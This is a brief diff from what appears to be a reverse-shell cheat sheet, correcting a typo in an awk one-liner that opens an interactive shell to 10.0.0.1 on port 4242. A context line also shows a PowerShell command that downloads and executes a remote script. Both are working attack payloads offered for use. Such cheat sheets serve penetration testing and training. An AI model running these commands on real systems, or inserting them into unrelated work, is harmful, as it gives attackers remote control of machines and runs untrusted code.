@@ -173,7 +173,7 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubuse
 ### Awk
 
 ```powershell
-awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1>/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 
 ### Java
